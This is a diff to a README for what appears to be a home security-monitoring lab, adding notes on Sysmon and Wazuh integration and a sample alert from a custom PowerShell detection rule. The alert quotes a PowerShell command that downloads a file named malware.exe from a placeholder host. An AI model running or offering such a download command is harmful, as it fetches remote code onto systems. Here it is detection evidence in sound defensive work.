@@ -38,17 +38,29 @@ File Integrity Monitoring (FIM) is crucial for maintaining a system's security a
   rule.id: 550
   rule.description: Integrity checksum changed
   rule.level: 7
+  mitre
 
 <img src="docs/fim-example1.png" alt="FIM Example" width="400"> <img src="docs/fim-example2.png" alt="FIM Example" width="530"> <img src="docs/fim-example3.png" alt="FIM Example" width="400"> 
 
 ---
 
 ### 2. Sysmon + Wazuh Integration
-- Installed **Sysmon** on Windows
+Sysmon provides detailed system activity logging, while Wazuh processes and analyzes these logs for threat detection and incident response.
+- Installed and configured **Sysmon** on Windows agent
 - Forwarded process creation & PowerShell logs to Wazuh
-- Detected suspicious PowerShell execution
+- Created custom PowerShell Detection Rules
+- Detected suspicious web download activity
 
-![Sysmon Alert](docs/sysmon-alert.png)
+```
+Sep 26, 2025 @ 11:07:23.871
+agent.name: windows
+command: \"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"(New-Object Net.WebClient).DownloadString('http://example.com/malware.exe')\"
+rule.description: "Suspicious PowerShell: Web download activity detected"
+rule.id: 100004
+rule.level: 12
+mitre.technique: PowerShell(T1059.001), Ingress Tool Transfer(T1105), Web Protocols(T1071.001)
+```
+<img src="docs/sysmon1.png" alt="Sysmon Example" width="400"> <img src="docs/sysmon2.png" alt="Sysmon example" width="400">
 
 ---
 
